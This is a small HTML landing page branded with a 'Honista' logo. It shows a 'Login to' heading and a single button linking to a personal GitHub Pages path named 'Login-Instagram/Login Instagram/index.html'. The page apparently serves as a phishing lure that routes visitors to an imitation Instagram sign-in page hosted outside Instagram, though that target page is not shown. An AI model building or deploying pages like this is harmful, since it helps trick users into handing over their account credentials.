<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title></title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #f00072, #fc466b, #3f5efb);
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background-color: #fff;
      border-radius: 20px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
      padding: 40px;
      width: 300px;
      text-align: center;
    }

    .login-container img {
      width: 80px;
      margin-bottom: 20px;
    }

    .login-container h2 {
      color: #333;
      margin-bottom: 20px;
    }

    .login-btn {
      display: inline-block;
      width: 100%;
      padding: 10px;
      background-color: #f00072;
      color: #fff;
      text-decoration: none;
      text-align: center;
      border-radius: 10px;
      font-weight: bold;
      transition: background 0.3s;
    }

    .login-btn:hover {
      background-color: #cc0066;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="honista.png" alt="Honista Logo" />
    <h2>Login to</h2>
    <a href="https://itsmiro1.github.io/Login-Instagram/Login%20Instagram/index.html" class="login-btn">Login</a>
  </div>
</body>
</html>
